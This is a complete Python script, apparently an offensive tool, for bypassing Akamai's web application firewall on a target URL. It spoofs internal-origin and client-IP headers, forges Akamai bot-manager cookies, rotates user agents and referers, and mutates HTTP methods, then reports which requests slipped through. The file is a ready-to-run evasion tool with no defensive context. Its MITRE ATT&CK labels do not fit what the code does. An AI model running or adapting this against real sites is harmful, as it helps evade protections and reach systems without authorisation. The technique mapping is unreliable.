#!/usr/bin/env python3
"""
Akamai WAF Bypass Tool

MITRE ATT&CK Mapping:
  T1203 - Exploitation for Client Execution
  T1190 - Exploit Public-Facing Application
  T1059 - Command and Scripting Interpreter

Tests header mutation, cookie manipulation, EdgeScrap simulation, and
HTTP method mutation against Akamai-protected targets.
"""

import argparse
import json
import os
import random
import signal
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from colorama import Fore, Style, init

init(autoreset=True)
SHOULD_EXIT = False

BANNER = f"""{Fore.CYAN}
    _    _  __ _  __ _ _ __   __ _ _ __    _ __   __ _ _ __ ___  ___
   / \\  | |/ _` |/ _` | '_ \\ / _` | '_ \\  | '_ \\ / _` | '_ ` _ \\/ __|
  / _ \\ | | (_| | (_| | | | | (_| | | | | | |_) | (_| | | | | | \\__ \\
 /_/ \\_\\|_|\\__,_|\\__,_|_| |_|\\__,_|_| |_| | .__/ \\__,_|_| |_| |_|___/
                                           |_|
{Fore.RESET}"""


def signal_handler(sig, frame):
    global SHOULD_EXIT
    SHOULD_EXIT = True
    print(f"\n{Fore.YELLOW}[!] Interrupted.{Style.RESET_ALL}")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]


def fetch(url, timeout_sec, headers=None, cookies=None):
    h = {"User-Agent": random.choice(AGENTS)}
    if headers:
        h.update(headers)
    try:
        return requests.get(url, headers=h, cookies=cookies or {}, timeout=timeout_sec)
    except requests.RequestException as e:
        return None


def target_ok(url):
    r = fetch(url, 10)
    return r is not None and r.status_code < 500


def technique_header_mutation(url, timeout_sec):
    results = []
    baseline = fetch(url, timeout_sec)
    if baseline is None:
        return [{"technique": "header_mutation", "detail": "baseline_failed", "bypassed": False}]
    bl_len = len(baseline.text)
    tests = [
        {"X-Forwarded-For": "127.0.0.1", "X-Akamai-Edge": "yes"},
        {"X-Akamai-Client-IP": "127.0.0.1"},
        {"X-Akamai-True-Client-IP": "203.0.113.1"},
        {"X-True-Client-IP": "198.51.100.1"},
        {"Via": "1.1 akamai.net (AkamaiGHost)"},
        {"X-Forwarded-Host": "internal.target.com"},
        {"X-Akamai-Origin": "internal"},
        {"X-Originating-IP": "127.0.0.1"},
        {"Akamai-Origin-Hop": "true"},
        {"X-Akamai-EdgeScape": "true"},
    ]
    for h in tests:
        if SHOULD_EXIT:
            break
        resp = fetch(url, timeout_sec, headers=h)
        if resp is None:
            results.append({"technique": "header_mutation", "headers": str(h), "bypassed": False, "error": "failed"})
        else:
            blocked = resp.status_code in (403, 429, 503)
            diff = abs(len(resp.text) - bl_len)
            results.append({"technique": "header_mutation", "headers": str(h), "status": resp.status_code, "bypassed": not blocked and (diff > 30 or resp.status_code == 200)})
    return results


def technique_cookie_manipulation(url, timeout_sec):
    results = []
    tests = [
        {"akamai_bot": "verified"}, {"_abck": "fake_abck_value_001"},
        {"bm_sz": "fake_bm_sz_002"}, {"akavpau_pp": "FakeToken"},
        {"ak_bmsc": "fake_ak_bmsc_003"},
        {"session_id": "deadbeef1234", "akamai_edge": "true"},
    ]
    for ck in tests:
        if SHOULD_EXIT:
            break
        resp = fetch(url, timeout_sec, cookies=ck)
        if resp is None:
            results.append({"technique": "cookie_manipulation", "cookies": str(ck), "bypassed": False, "error": "failed"})
        else:
            results.append({"technique": "cookie_manipulation", "cookies": str(ck), "status": resp.status_code, "bypassed": resp.status_code == 200})
    return results


def technique_edgescrap(url, timeout_sec):
    results = []
    referers = ["https://www.google.com/", "https://www.facebook.com/", "https://twitter.com/", "https://www.bing.com/", ""]
    for ua in AGENTS:
        if SHOULD_EXIT:
            break
        ref = random.choice(referers)
        h = {"User-Agent": ua, "Accept-Language": "en-US,en;q=0.9", "Accept": "text/html,*/*;q=0.8"}
        if ref:
            h["Referer"] = ref
        resp = fetch(url, timeout_sec, headers=h)
        if resp is None:
            results.append({"technique": "edgescrap", "ua": ua[:40], "bypassed": False, "error": "failed"})
        else:
            results.append({"technique": "edgescrap", "ua": ua[:40], "status": resp.status_code, "bypassed": resp.status_code == 200})
    return results


def technique_method_mutation(url, timeout_sec):
    results = []
    for method in ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]:
        if SHOULD_EXIT:
            break
        try:
            fn = requests.head if method == "HEAD" else lambda *a, **kw: requests.request(method, *a, **kw)
            resp = fn(url, timeout=timeout_sec, headers={"User-Agent": random.choice(AGENTS)})
            blocked = resp.status_code in (403, 429, 405, 503)
            results.append({"technique": "method_mutation", "method": method, "status": resp.status_code, "bypassed": not blocked and resp.status_code in (200, 201, 204, 301, 302)})
        except requests.RequestException as e:
            results.append({"technique": "method_mutation", "method": method, "bypassed": False, "error": str(e)})
    return results


def run_techniques(url, timeout_sec, threads):
    print(f"\n{Fore.CYAN}[*] Target: {url}{Style.RESET_ALL}")
    if not target_ok(url):
        print(f"{Fore.RED}[X] Target unreachable.{Style.RESET_ALL}")
        return []
    all_results = []
    techniques = [
        ("Header Mutation", technique_header_mutation),
        ("Cookie Manipulation", technique_cookie_manipulation),
        ("EdgeScrap", technique_edgescrap),
        ("Method Mutation", technique_method_mutation),
    ]
    with ThreadPoolExecutor(max_workers=threads) as ex:
        fmap = {ex.submit(fn, url, timeout_sec): name for name, fn in techniques}
        for f in as_completed(fmap):
            name = fmap[f]
            try:
                res = f.result()
                all_results.extend(res)
                b = sum(1 for r in res if r.get("bypassed"))
                print(f"{Fore.GREEN}[+] {name}: {b}/{len(res)} bypassed{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[X] {name} failed: {e}{Style.RESET_ALL}")
    return all_results


def print_report(results):
    if not results:
        return
    bypassed = [r for r in results if r.get("bypassed")]
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  AKAMAI BYPASS | total={len(results)} bypassed={len(bypassed)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    for r in bypassed:
        d = r.get("headers") or r.get("cookies") or r.get("method") or r.get("ua", "?")
        print(f"  {Fore.GREEN}[BYPASS] {r['technique']} | {d}{Style.RESET_ALL}")
    for r in [r for r in results if not r.get("bypassed")][:10]:
        d = r.get("headers") or r.get("cookies") or r.get("method") or r.get("ua", "?")
        print(f"  {Fore.YELLOW}[BLOCKED] {r['technique']} | {d}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description="Akamai WAF Bypass — MITRE T1203, T1190, T1059")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--threads", type=int, default=5, help="Max threads")
    parser.add_argument("-o", "--output", help="Save JSON output")
    args = parser.parse_args()
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    results = run_techniques(args.url, args.timeout, args.threads)
    print_report(results)
    if args.output and results:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n{Fore.CYAN}[*] Saved to {args.output}{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}[*] {sum(1 for r in results if r.get('bypassed'))} bypasses found.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
